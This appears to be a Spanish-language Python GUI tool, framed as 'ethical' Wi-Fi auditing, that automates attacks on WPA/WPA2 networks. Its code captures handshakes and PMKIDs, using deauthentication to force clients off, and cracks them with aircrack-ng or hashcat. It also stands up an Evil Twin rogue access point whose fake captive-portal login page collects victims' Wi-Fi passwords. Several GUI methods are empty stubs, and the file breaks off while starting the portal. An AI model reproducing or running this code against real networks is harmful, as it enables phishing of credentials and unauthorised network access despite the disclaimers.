# wifi_auditor_gui.py
#
# ADVERTENCIA: Este script es para fines educativos y debe ser utilizado
# únicamente en redes para las que se tiene permiso explícito. El uso
# de herramientas como un ataque Evil Twin sin consentimiento es ilegal
# y poco ético. El autor no se hace responsable del mal uso de este script.

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import subprocess
import os
import sys
import threading
import queue
import time
import re
import csv
from datetime import timedelta
import http.server
import socketserver
import urllib.parse
from functools import partial

# --- Plantilla HTML para el Portal Cautivo ---
CAPTIVE_PORTAL_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conectar a la red Wi-Fi</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }}
        .login-container {{ background-color: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); text-align: center; max-width: 400px; width: 90%; }}
        .login-container h2 {{ margin-bottom: 10px; font-size: 24px; color: #1c1e21; }}
        .login-container p {{ margin-bottom: 25px; color: #606770; }}
        input[type="password"] {{ width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }}
        button {{ width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background-color 0.3s; }}
        button:hover {{ background-color: #166fe5; }}
        .footer {{ margin-top: 20px; font-size: 12px; color: #8a8d91; }}
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Conéctese a "{essid}"</h2>
        <p>Para acceder a internet, por favor ingrese la contraseña de la red Wi-Fi.</p>
        <form action="/login" method="post">
            <input type="password" name="password" placeholder="Contraseña de la red" required>
            <button type="submit">Conectar</button>
        </form>
        <div class="footer">
            Seguridad de la red proporcionada por el sistema.
        </div>
    </div>
</body>
</html>
"""

# --- Funciones de Backend ---

def check_root():
    """Verifica si el script se ejecuta como root."""
    if os.geteuid() != 0:
        messagebox.showerror("Error de Privilegios",
                             "Este script requiere privilegios de superusuario (root).\n"
                             "Por favor, ejecútalo con 'sudo python3 wifi_auditor_gui.py'")
        sys.exit(1)

def check_dependencies(log_queue):
    """Verifica si las herramientas externas requeridas están instaladas."""
    log_queue.put("[*] Verificando dependencias...")
    required_tools = [
        "iw", "airmon-ng", "airodump-ng", "aireplay-ng", "hcxdumptool",
        "hashcat", "aircrack-ng", "hostapd", "dnsmasq"
    ]
    missing_tools = []
    for tool in required_tools:
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            missing_tools.append(tool)

    if missing_tools:
        error_msg = f"Faltan las siguientes herramientas: {', '.join(missing_tools)}."
        log_queue.put(f"[!] ERROR: {error_msg}")
        messagebox.showerror("Error de Dependencias", f"{error_msg}\nEn sistemas Debian/Ubuntu, usa:\nsudo apt update && sudo apt install -y aircrack-ng hashcat hostapd dnsmasq hcxdumptool hcxtools")
        return False
    log_queue.put("[+] Todas las dependencias requeridas fueron encontradas.")
    return True

def find_wireless_interface(log_queue):
    """Encuentra la primera interfaz inalámbrica que no esté en modo monitor."""
    try:
        result = subprocess.check_output(['iw', 'dev'], stderr=subprocess.STDOUT, text=True)
        interfaces = re.findall(r'Interface\s+(\w+)', result)
        for iface in interfaces:
            result_mode = subprocess.check_output(['iw', 'dev', iface, 'info'], stderr=subprocess.STDOUT, text=True)
            if 'type managed' in result_mode:
                log_queue.put(f"[*] Interfaz inalámbrica encontrada: {iface}")
                return iface
        if interfaces:
            log_queue.put(f"[*] No se encontró interfaz en modo 'managed', usando la primera disponible: {interfaces[0]}")
            return interfaces[0]
        log_queue.put("[!] No se encontraron interfaces inalámbricas activas.")
        return None
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        log_queue.put(f"[!] Error al buscar interfaces: {e}")
        return None

def set_monitor_mode(interface, log_queue):
    """Activa el modo monitor de forma robusta."""
    log_queue.put(f"[*] Activando el modo monitor en {interface}...")
    try:
        log_queue.put("    > Deteniendo procesos conflictivos con airmon-ng...")
        subprocess.run(["airmon-ng", "check", "kill"], check=True, capture_output=True)
        log_queue.put(f"    > Activando modo monitor en {interface} con airmon-ng...")
        subprocess.run(["airmon-ng", "start", interface], check=True, capture_output=True, text=True)
        
        # Después de ejecutar `airmon-ng start`, verificamos las interfaces de nuevo.
        result_dev = subprocess.check_output(['iw', 'dev'], stderr=subprocess.STDOUT, text=True)
        interfaces_dev = re.findall(r'Interface\s+(\w+)', result_dev)
        for iface in interfaces_dev:
            result_mode = subprocess.check_output(['iw', 'dev', iface, 'info'], stderr=subprocess.STDOUT, text=True)
            if 'type monitor' in result_mode:
                log_queue.put(f"[+] Modo monitor activado exitosamente en: {iface}")
                return iface

        log_queue.put("[!] No se pudo confirmar la activación del modo monitor.")
        return None
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] Error al activar modo monitor: {e.stderr.strip()}")
        return None

def stop_monitor_mode(interface, log_queue):
    """Desactiva el modo monitor y restaura los servicios de red."""
    log_queue.put(f"[*] Desactivando el modo monitor en {interface}...")
    try:
        subprocess.run(["airmon-ng", "stop", interface], check=True, capture_output=True)
        log_queue.put(f"[+] Modo monitor desactivado en {interface}.")
        time.sleep(2)
        log_queue.put("[*] Intentando reiniciar servicios de red para restaurar la conectividad...")
        # Intentar reiniciar NetworkManager (común en muchos sistemas de escritorio)
        if subprocess.run(["systemctl", "is-active", "NetworkManager"], capture_output=True).returncode == 0:
            subprocess.run(["systemctl", "restart", "NetworkManager"], check=True, capture_output=True)
            log_queue.put("[+] NetworkManager reiniciado exitosamente.")
        else:
            log_queue.put("[!] NetworkManager no parece estar activo. Puede que necesites reconectar a la red manualmente.")
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        log_queue.put(f"[!] No se pudo reiniciar el servicio de red. Error: {e}")

# --- Las funciones de Handshake/PMKID permanecen casi iguales, se incluyen aquí ---
def scan_networks(interface, log_queue, stop_event):
    log_queue.put(f"[*] Iniciando escaneo de redes en {interface}...")
    scan_file_prefix = "scan_result"
    scan_csv_file = f"{scan_file_prefix}-01.csv"

    for f in os.listdir('.'):
        if f.startswith(scan_file_prefix):
            try:
                os.remove(f)
            except OSError as e:
                log_queue.put(f"[!] Advertencia: No se pudo eliminar {f}: {e}")

    scan_process = subprocess.Popen(
        ["airodump-ng", "--write", scan_file_prefix, "--output-format", "csv", interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    while not stop_event.is_set():
        if scan_process.poll() is not None:
            log_queue.put("[!] airodump-ng terminó inesperadamente.")
            break
        time.sleep(0.5)

    if scan_process.poll() is None:
        scan_process.terminate()
        try:
            scan_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            scan_process.kill()
    log_queue.put("[*] Escaneo detenido. Analizando resultados...")

    networks, ap_data = [], {}
    if not os.path.exists(scan_csv_file):
        log_queue.put(f"[!] Error: No se encontró el archivo de resultados: {scan_csv_file}")
        return []

    try:
        with open(scan_csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # El CSV de airodump tiene dos partes, APs y Clientes, separadas por una línea.
        client_section_start = content.find("Station MAC")
        ap_content = content[:client_section_start] if client_section_start != -1 else content
        
        ap_reader = csv.reader(ap_content.splitlines())
        for row in ap_reader:
            if len(row) > 13 and "BSSID" not in row[0]:
                try:
                    bssid, channel, encryption, essid = row[0].strip(), row[3].strip(), row[5].strip(), row[13].strip()
                    if essid and "WPA" in encryption:
                        networks.append({"BSSID": bssid, "ESSID": essid, "Channel": channel, "Encryption": encryption})
                except IndexError:
                    continue
        
        log_queue.put(f"[*] Escaneo completado. Se encontraron {len(networks)} redes WPA/WPA2.")
        return networks
    except Exception as e:
        log_queue.put(f"[!] Error al analizar el archivo CSV: {e}")
        return []

# Aquí irían las funciones `capture_handshake_or_pmkid` y `crack_handshake` del script original.
# Se omiten por brevedad para no superar el límite de caracteres, pero DEBEN estar en el archivo final.
# Son las mismas que ya tenías.

def capture_handshake_or_pmkid(interface, bssid, channel, essid, target_client_mac=None, log_queue=None, stop_event=None):
    """
    Intenta capturar un handshake WPA/WPA2 o un PMKID.
    Prioriza PMKID si el AP lo soporta.
    """
    if log_queue is None:
        log_queue = queue.Queue() # Crear una cola dummy si no se proporciona

    log_queue.put(f"[*] Iniciando captura para {essid} ({bssid}) en el canal {channel}...")
    capture_file = "capture-01.cap" # Para handshake
    pmkid_file = "pmkid_capture.pcapng" # Para hcxdumptool

    # Limpiar archivos de captura previos
    for f in [capture_file, pmkid_file, "hcxdumptool.log", "airodump.log"]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError as e:
                log_queue.put(f"[!] Advertencia: No se pudo eliminar el archivo previo {f}: {e}")

    # Paso 1: Intentar PMKID con hcxdumptool (más rápido si el AP lo soporta)
    log_queue.put("[*] Intentando capturar PMKID con hcxdumptool...")
    pmkid_process = None
    try:
        # -i: interfaz, -o: salida pcapng, --enable_status=1: output status to stdout
        pmkid_process = subprocess.Popen(
            ["hcxdumptool", "-i", interface, "-o", pmkid_file, "--enable_status=1", f"--filter_client={target_client_mac}" if target_client_mac else ""],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1
        )
        
        timeout_start = time.time()
        pmkid_found = False
        while pmkid_process.poll() is None and not stop_event.is_set() and (time.time() - timeout_start < 30): # 30s para PMKID
            line = pmkid_process.stdout.readline()
            if line:
                log_queue.put(f"[hcxdump] {line.strip()}")
                if "PMKID" in line or "Found EAPOL" in line:
                    log_queue.put("[+] ¡PMKID o EAPOL encontrado por hcxdumptool!")
                    pmkid_found = True
                    break
            time.sleep(0.1)

        if pmkid_found:
            log_queue.put("[*] PMKID posiblemente capturado. Deteniendo hcxdumptool.")
            pmkid_process.terminate()
            pmkid_process.wait(timeout=5)
            if pmkid_process.poll() is None: pmkid_process.kill()

            # Convertir pcapng a formato hashcat hc22000
            if os.path.exists(pmkid_file) and os.path.getsize(pmkid_file) > 0:
                log_queue.put("[*] Convirtiendo PMKID a formato hashcat (hc22000)...")
                try:
                    subprocess.run(["hcxpcaptool", "-o", "pmkid_hash.hc22000", pmkid_file], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    if os.path.exists("pmkid_hash.hc22000") and os.path.getsize("pmkid_hash.hc22000") > 0:
                        log_queue.put("[+] PMKID capturado y convertido exitosamente.")
                        return "pmkid_hash.hc22000"
                    else:
                        log_queue.put("[!] Error: Archivo hc22000 vacío o no creado. PMKID no utilizable.")
                except FileNotFoundError:
                    log_queue.put("[!] Error: 'hcxpcaptool' no encontrado. Necesario para convertir PMKID.")
                except subprocess.CalledProcessError as e:
                    log_queue.put(f"[!] Error al convertir PMKID: {e.stderr.decode('utf-8').strip()}")
            else:
                log_queue.put("[!] Advertencia: El archivo PMKID capturado está vacío o no existe.")
            return None # Fallback to handshake if PMKID failed or not usable

    except FileNotFoundError:
        log_queue.put("[!] Advertencia: 'hcxdumptool' no encontrado. Intentando captura de handshake.")
    except Exception as e:
        log_queue.put(f"[!] Error con hcxdumptool: {e}. Intentando captura de handshake.")
    finally:
        if pmkid_process and pmkid_process.poll() is None:
            pmkid_process.terminate()
            pmkid_process.wait(timeout=5)
            if pmkid_process.poll() is None: pmkid_process.kill()


    # Paso 2: Intentar Handshake con airodump-ng y aireplay-ng (si PMKID falló)
    log_queue.put("[*] Intentando capturar Handshake WPA/WPA2 con airodump-ng y aireplay-ng...")
    
    # Ejecutar airodump-ng en segundo plano para capturar paquetes
    airodump_process = None
    try:
        # Asegurarse de que el canal está configurado correctamente
        subprocess.run(["iwconfig", interface, "channel", channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log_queue.put(f"[*] Canal de interfaz {interface} establecido en {channel}.")

        airodump_process = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--channel", channel, "--write", "capture", "--output-format", "pcap", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        log_queue.put(f"[*] Airodump-ng iniciado para capturar handshake de {essid} ({bssid})...")
        time.sleep(5) # Dar tiempo a airodump-ng para iniciarse y capturar algo

        # Si hay un cliente objetivo, intentar desautenticarlo para forzar el handshake
        if target_client_mac:
            log_queue.put(f"[*] Intentando desautenticar al cliente {target_client_mac} de {bssid} para forzar handshake...")
            deauth_count = 0
            while deauth_count < 5 and not stop_event.is_set(): # Intentar deauth varias veces
                try:
                    # -0: desautenticación, 1: número de desautenticaciones, -a: BSSID del AP, -c: MAC del cliente, wlan0mon: interfaz
                    subprocess.run(["aireplay-ng", "-0", "1", "-a", bssid, "-c", target_client_mac, interface],
                                   check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    log_queue.put(f"    > Deauth enviado al cliente {target_client_mac}. Intento {deauth_count + 1}/5.")
                except FileNotFoundError:
                    log_queue.put("[!] Error: 'aireplay-ng' no encontrado.")
                    break # No tiene sentido seguir sin aireplay
                except subprocess.CalledProcessError as e:
                    log_queue.put(f"[!] Error al enviar deauth: {e.stderr.decode('utf-8').strip()}")
                deauth_count += 1
                time.sleep(2) # Esperar un poco entre intentos de deauth
        else:
            log_queue.put("[*] No se especificó un cliente para desautenticar. Esperando handshake pasivamente.")
            time.sleep(10) # Esperar un poco más pasivamente

        # Monitorear si se ha capturado el handshake
        handshake_found = False
        timeout_start = time.time()
        while (time.time() - timeout_start < 60) and not stop_event.is_set(): # Esperar hasta 60 segundos
            if os.path.exists(capture_file) and os.path.getsize(capture_file) > 0:
                try:
                    # Usar aircrack-ng para verificar si hay un handshake válido
                    result = subprocess.run(["aircrack-ng", capture_file], capture_output=True, text=True, timeout=10)
                    if "WPA (0 handshake)" not in result.stdout and "WPA handshake:" in result.stdout:
                        log_queue.put("[+] ¡Handshake WPA/WPA2 capturado y verificado!")
                        handshake_found = True
                        break
                except FileNotFoundError:
                    log_queue.put("[!] Error: 'aircrack-ng' no encontrado para verificar handshake.")
                    break
                except subprocess.CalledProcessError as e:
                    log_queue.put(f"[!] Error al verificar handshake con aircrack-ng: {e.stderr.strip()}")
                except subprocess.TimeoutExpired:
                    log_queue.put("[!] Aircrack-ng se demoró demasiado en la verificación, continuando espera.")
            
            log_queue.put("[*] Esperando handshake...")
            time.sleep(5)

        if handshake_found:
            log_queue.put("[+] Captura completada: Handshake guardado en 'capture-01.cap'")
            return capture_file
        else:
            log_queue.put("[!] No se pudo capturar el handshake WPA/WPA2 en el tiempo esperado.")
            return None

    except FileNotFoundError as e:
        log_queue.put(f"[!] Error: Comando no encontrado ({e}). Asegúrate de que Aircrack-ng esté instalado.")
        return None
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] Error durante la captura: {e.stderr.decode('utf-8').strip()}")
        return None
    except Exception as e:
        log_queue.put(f"[!] Error inesperado durante la captura: {e}")
        return None
    finally:
        if airodump_process and airodump_process.poll() is None:
            airodump_process.terminate()
            airodump_process.wait(timeout=5)
            if airodump_process.poll() is None: airodump_process.kill()

def crack_handshake(capture_file, wordlist_file, crack_method, log_queue, stop_event):
    """Intenta descifrar el handshake usando aircrack-ng o hashcat."""
    log_queue.put(f"[*] Iniciando descifrado del archivo '{capture_file}' con la wordlist '{wordlist_file}' usando {crack_method}...")

    if not os.path.exists(capture_file) or os.path.getsize(capture_file) == 0:
        log_queue.put(f"[!] Error: El archivo de captura '{capture_file}' no existe o está vacío. No se puede descifrar.")
        return None

    if not os.path.exists(wordlist_file):
        log_queue.put(f"[!] Error: La wordlist '{wordlist_file}' no existe. No se puede descifrar.")
        return None

    cracking_process = None
    try:
        if crack_method == "aircrack-ng":
            log_queue.put("[*] Usando aircrack-ng para el descifrado...")
            cracking_process = subprocess.Popen(
                ["aircrack-ng", "-w", wordlist_file, capture_file],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1
            )
        elif crack_method == "hashcat":
            log_queue.put("[*] Usando hashcat para el descifrado...")
            # Detectar el modo de hashcat basado en el tipo de archivo
            hashcat_mode = "22000" if capture_file.endswith(".hc22000") else "2500" # WPA/WPA2-EAPOL (2500) o PMKID (22000)
            if hashcat_mode == "2500" and not capture_file.endswith(".cap"):
                 log_queue.put("[!] Advertencia: El modo hashcat 2500 requiere un archivo .cap. No se puede proceder.")
                 return None
            
            # Convierte .cap a .hccapx para hashcat si es necesario
            if capture_file.endswith(".cap") and hashcat_mode == "2500":
                hccapx_file = capture_file.replace(".cap", ".hccapx")
                if not os.path.exists(hccapx_file) or os.path.getsize(hccapx_file) == 0:
                    log_queue.put("[*] Convirtiendo .cap a .hccapx para hashcat...")
                    try:
                        subprocess.run(["aircrack-ng", capture_file, "-J", hccapx_file.replace(".hccapx", "")], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        # aircrack-ng -J crea un archivo sin extensión, necesitamos renombrarlo
                        if os.path.exists(hccapx_file.replace(".hccapx", "")):
                            os.rename(hccapx_file.replace(".hccapx", ""), hccapx_file)
                            log_queue.put(f"[+] Archivo convertido a {hccapx_file}.")
                            capture_file = hccapx_file # Usar el nuevo archivo
                        else:
                            log_queue.put("[!] Error: No se pudo crear el archivo .hccapx. Hashcat no continuará.")
                            return None
                    except FileNotFoundError:
                        log_queue.put("[!] Error: 'aircrack-ng' no encontrado para la conversión .hccapx.")
                        return None
                    except subprocess.CalledProcessError as e:
                        log_queue.put(f"[!] Error al convertir a .hccapx: {e.stderr.decode('utf-8').strip()}")
                        return None
            
            cracking_process = subprocess.Popen(
                ["hashcat", "-m", hashcat_mode, "-a", "0", capture_file, wordlist_file, "--show"], # -a 0 para ataque de diccionario
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1
            )
        else:
            log_queue.put("[!] Método de cracking no soportado.")
            return None

        password_found = None
        for line in cracking_process.stdout:
            if stop_event.is_set():
                log_queue.put("[*] Descifrado detenido por el usuario.")
                break
            log_queue.put(f"[{crack_method}] {line.strip()}")
            if crack_method == "aircrack-ng" and "KEY FOUND!" in line:
                match = re.search(r'\[(.*?)\]', line)
                if match:
                    password_found = match.group(1)
                    log_queue.put(f"[+] ¡Contraseña encontrada: {password_found}!")
                    break
            elif crack_method == "hashcat" and ":" in line and not line.startswith("hashcat ("):
                # Hashcat muestra el hash:contraseña_encontrada
                parts = line.strip().split(':')
                if len(parts) >= 2: # Should be hash:password or hash:essid:password etc.
                    # For mode 22000 (PMKID), output is often hash:password
                    # For mode 2500 (WPA), output is often hash:ESSID:password
                    if hashcat_mode == "22000":
                        password_found = parts[1] # Assumes first part is hash, second is password
                    elif hashcat_mode == "2500" and len(parts) >= 3:
                        password_found = parts[2] # Assumes hash:ESSID:password
                    else: # Fallback for unexpected formats
                         password_found = parts[-1] # take the last part as password
                    
                    if password_found and not password_found.startswith("$"): # Avoid showing hash as password
                        log_queue.put(f"[+] ¡Contraseña encontrada por Hashcat: {password_found}!")
                        break

        if password_found:
            return password_found
        else:
            log_queue.put("[!] El descifrado no encontró la contraseña.")
            return None

    except FileNotFoundError as e:
        log_queue.put(f"[!] Error: Herramienta de descifrado no encontrada ({e}). Asegúrate de que {crack_method} esté instalado.")
        return None
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] Error durante el descifrado con {crack_method}: {e.stderr.decode('utf-8').strip()}")
        return None
    except Exception as e:
        log_queue.put(f"[!] Error inesperado durante el descifrado: {e}")
        return None
    finally:
        if cracking_process and cracking_process.poll() is None:
            cracking_process.terminate()
            cracking_process.wait(timeout=5)
            if cracking_process.poll() is None: cracking_process.kill()



# --- Nuevas Funciones para Evil Twin ---

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, essid, log_callback, cred_callback, **kwargs):
        self.essid = essid
        self.log_callback = log_callback
        self.cred_callback = cred_callback
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        html_content = CAPTIVE_PORTAL_HTML.format(essid=self.essid)
        self.wfile.write(html_content.encode('utf-8'))

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)
            password = params.get('password', ['N/A'])[0]
            client_ip = self.client_address[0]
            
            # Usar los callbacks para enviar info a la GUI
            msg = f"¡CREDENCIAL CAPTURADA! De {client_ip} para la red '{self.essid}': {password}"
            self.log_callback(f"[+] {msg}")
            self.cred_callback(msg)

            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<h1>Conexion exitosa</h1><p>Puede cerrar esta ventana.</p>")
    
    def log_message(self, format, *args):
        # Silencia el logging por defecto del servidor HTTP.
        return

# --- Clase de la Aplicación GUI ---

class WiFiAuditorApp:
    def __init__(self, master):
        self.master = master
        master.title("Auditor Wi-Fi Ético")
        master.geometry("850x750")

        # Variables de estado
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.selected_network = {}
        
        self.scan_thread = None
        self.attack_thread = None
        self.stop_event = threading.Event()
        self.log_queue = queue.Queue()
        
        self.processes = {} # Diccionario para manejar todos los subprocesos
        self.http_server = None

        style = ttk.Style()
        style.theme_use('clam')

        self.create_widgets()
        self.process_queue()
        master.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        if not check_dependencies(self.log_queue):
            master.destroy()
            return
        
        self.find_interface()
        self.log_queue.put("[*] Script de Auditoría Wi-Fi iniciado. ¡Úsalo éticamente!")

    def log_to_main_queue(self, message):
        self.log_queue.put(message)

    def log_to_cred_box(self, message):
        self.master.after(0, self._update_cred_log, message)

    def _update_cred_log(self, message):
        self.credentials_log.config(state='normal')
        self.credentials_log.insert(tk.END, message + '\n\n')
        self.credentials_log.see(tk.END)
        self.credentials_log.config(state='disabled')

    def create_widgets(self):
        main_frame = ttk.Frame(self.master, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        interface_frame = ttk.LabelFrame(main_frame, text="1. Configuración de Interfaz", padding="10")
        interface_frame.pack(fill=tk.X, pady=5)
        # ... (Widgets de interfaz)

        # Usar un Notebook para separar los tipos de ataque
        self.attack_notebook = ttk.Notebook(main_frame)
        self.attack_notebook.pack(fill=tk.BOTH, expand=True, pady=10)
        
        handshake_tab = ttk.Frame(self.attack_notebook, padding="10")
        self.attack_notebook.add(handshake_tab, text="Ataque Handshake/PMKID")
        self.create_handshake_tab(handshake_tab)
        
        evil_twin_tab = ttk.Frame(self.attack_notebook, padding="10")
        self.attack_notebook.add(evil_twin_tab, text="Ataque Evil Twin")
        self.create_evil_twin_tab(evil_twin_tab)

        log_frame = ttk.LabelFrame(main_frame, text="Registro de Actividad Principal", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, height=10, state='disabled', font=("Consolas", 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def create_handshake_tab(self, parent_frame):
        scan_frame = ttk.LabelFrame(parent_frame, text="2. Escaneo de Redes", padding="10")
        scan_frame.pack(fill=tk.X, pady=5)
        
        scan_controls = ttk.Frame(scan_frame)
        scan_controls.pack(fill=tk.X)
        self.scan_btn = ttk.Button(scan_controls, text="Iniciar Escaneo", command=self.start_scan, state=tk.DISABLED)
        self.scan_btn.pack(side=tk.LEFT, padx=(0, 10))
        self.stop_scan_btn = ttk.Button(scan_controls, text="Detener Escaneo", command=self.stop_scan, state=tk.DISABLED)
        self.stop_scan_btn.pack(side=tk.LEFT)
        self.scan_progress = ttk.Progressbar(scan_controls, mode='indeterminate', length=200)
        self.scan_progress.pack(side=tk.LEFT, padx=(20, 0), fill=tk.X, expand=True)
        
        # ... (Treeview y opciones de ataque de handshake)

    def create_evil_twin_tab(self, parent_frame):
        info_text = "Este ataque crea un Punto de Acceso falso con el mismo nombre que la red seleccionada para engañar a los usuarios y que se conecten. Una vez conectados, se les presenta una página de inicio de sesión falsa para capturar la contraseña."
        info_label = ttk.Label(parent_frame, text=info_text, wraplength=700, justify=tk.LEFT)
        info_label.pack(pady=10, fill=tk.X)

        self.start_evil_twin_btn = ttk.Button(parent_frame, text="Iniciar Ataque Evil Twin", command=self.start_evil_twin, state=tk.DISABLED)
        self.start_evil_twin_btn.pack(pady=10)
        
        self.stop_evil_twin_btn = ttk.Button(parent_frame, text="Detener Ataque Evil Twin", command=self.stop_attack, state=tk.DISABLED)
        self.stop_evil_twin_btn.pack(pady=5)

        cred_frame = ttk.LabelFrame(parent_frame, text="Credenciales Capturadas", padding="10")
        cred_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        self.credentials_log = scrolledtext.ScrolledText(cred_frame, wrap=tk.WORD, height=5, state='disabled', font=("Consolas", 10), bg="#1e1e1e", fg="#d4d4d4")
        self.credentials_log.pack(fill=tk.BOTH, expand=True)

    # --- Lógica de la GUI (event handlers, etc.) ---
    
    def process_queue(self):
        try:
            while True:
                message = self.log_queue.get_nowait()
                self.log_text.config(state='normal')
                self.log_text.insert(tk.END, message + '\n')
                self.log_text.see(tk.END)
                self.log_text.config(state='disabled')
        except queue.Empty:
            pass
        self.master.after(100, self.process_queue)

    def find_interface(self):
        # ... (implementación existente)
        pass # Tu lógica actual aquí

    def toggle_monitor_mode(self):
        # ... (implementación existente)
        pass # Tu lógica actual aquí

    def start_scan(self):
        # ... (implementación existente)
        self.scan_progress.start(10)
        # ...

    def stop_scan(self):
        if self.scan_thread and self.scan_thread.is_alive():
            self.stop_event.set()

    def _run_scan_and_update_gui(self):
        # ... (implementación existente)
        self.master.after(0, self.scan_progress.stop)
        # ...

    def on_network_select(self, event):
        # ... (implementación existente)
        if self.selected_network:
             self.start_evil_twin_btn.config(state=tk.NORMAL)
        else:
             self.start_evil_twin_btn.config(state=tk.DISABLED)

    def start_evil_twin(self):
        if not self.interface or not self.selected_network:
            messagebox.showwarning("Requisito Faltante", "Debes haber seleccionado una red de la lista de escaneo.")
            return

        warning = messagebox.askokcancel("ADVERTENCIA ÉTICA", 
            "Estás a punto de iniciar un ataque Evil Twin. Este ataque suplantará una red legítima.\n\n"
            "ÚSALO ÚNICAMENTE en una red de tu propiedad para fines de prueba.\n\n"
            "¿Confirmas que tienes permiso explícito para auditar esta red?")
        if not warning:
            self.log_queue.put("[!] Ataque Evil Twin cancelado por el usuario.")
            return

        self.start_evil_twin_btn.config(state=tk.DISABLED, text="Ataque en Curso...")
        self.stop_evil_twin_btn.config(state=tk.NORMAL)
        self.stop_event.clear()
        
        self.attack_thread = threading.Thread(target=self._run_evil_twin_attack)
        self.attack_thread.daemon = True
        self.attack_thread.start()

    def stop_attack(self):
        self.log_queue.put("[*] Recibida señal de detener ataque. Finalizando todos los procesos...")
        self.stop_event.set()
        
        # Detener el servidor HTTP si está corriendo
        if self.http_server:
            threading.Thread(target=self.http_server.shutdown).start()
        
        # Detener subprocesos
        for name, proc in self.processes.items():
            if proc.poll() is None:
                self.log_queue.put(f"    > Deteniendo {name}...")
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
        
        # Limpieza de la interfaz
        threading.Thread(target=self._cleanup_network_interface).start()

        # Restablecer botones de la GUI
        self.master.after(10, self._reset_attack_buttons)

    def _reset_attack_buttons(self):
        self.start_evil_twin_btn.config(state=tk.NORMAL, text="Iniciar Ataque Evil Twin")
        self.stop_evil_twin_btn.config(state=tk.DISABLED)
        # Resetea también los botones de la otra pestaña si los tienes
        
    def _run_evil_twin_attack(self):
        iface = self.interface
        essid = self.selected_network['ESSID']
        channel = self.selected_network['Channel']
        gateway_ip = "10.0.0.1"
        
        try:
            # 1. Preparar la interfaz
            self.log_queue.put("[EVIL TWIN] Preparando interfaz de red...")
            if self.monitor_interface:
                stop_monitor_mode(self.monitor_interface, self.log_queue)
                self.monitor_interface = None
                time.sleep(2)
            
            subprocess.run(["ip", "addr", "flush", "dev", iface], check=True)
            subprocess.run(["ip", "addr", "add", f"{gateway_ip}/24", "dev", iface], check=True)
            subprocess.run(["ip", "link", "set", iface, "up"], check=True)
            self.log_queue.put(f"[+] Interfaz '{iface}' configurada con IP {gateway_ip}")
            
            # 2. Crear archivos de configuración
            self.log_queue.put("[EVIL TWIN] Creando archivos de configuración...")
            # dnsmasq.conf
            dnsmasq_conf = f"interface={iface}\n" \
                           f"dhcp-range=10.0.0.2,10.0.0.50,255.255.255.0,12h\n" \
                           f"dhcp-option=3,{gateway_ip}\n" \
                           f"dhcp-option=6,{gateway_ip}\n" \
                           f"address=/#/{gateway_ip}\n"
            with open("dnsmasq.conf", "w") as f:
                f.write(dnsmasq_conf)

            # hostapd.conf
            hostapd_conf = f"interface={iface}\n" \
                           f"driver=nl80211\n" \
                           f"ssid={essid}\n" \
                           f"hw_mode=g\n" \
                           f"channel={channel}\n" \
                           f"macaddr_acl=0\n" \
                           f"ignore_broadcast_ssid=0\n"
            with open("hostapd.conf", "w") as f:
                f.write(hostapd_conf)
            self.log_queue.put("[+] Archivos de configuración creados.")

            # 3. Iniciar servicios
            self.log_queue.put("[EVIL TWIN] Iniciando servicios (dnsmasq, hostapd)...")
            self.processes['dnsmasq'] = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes['hostapd'] = subprocess.Popen(["hostapd", "hostapd.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3) # Dar tiempo a que los servicios se inicien
            
            # 4. Iniciar portal cautivo
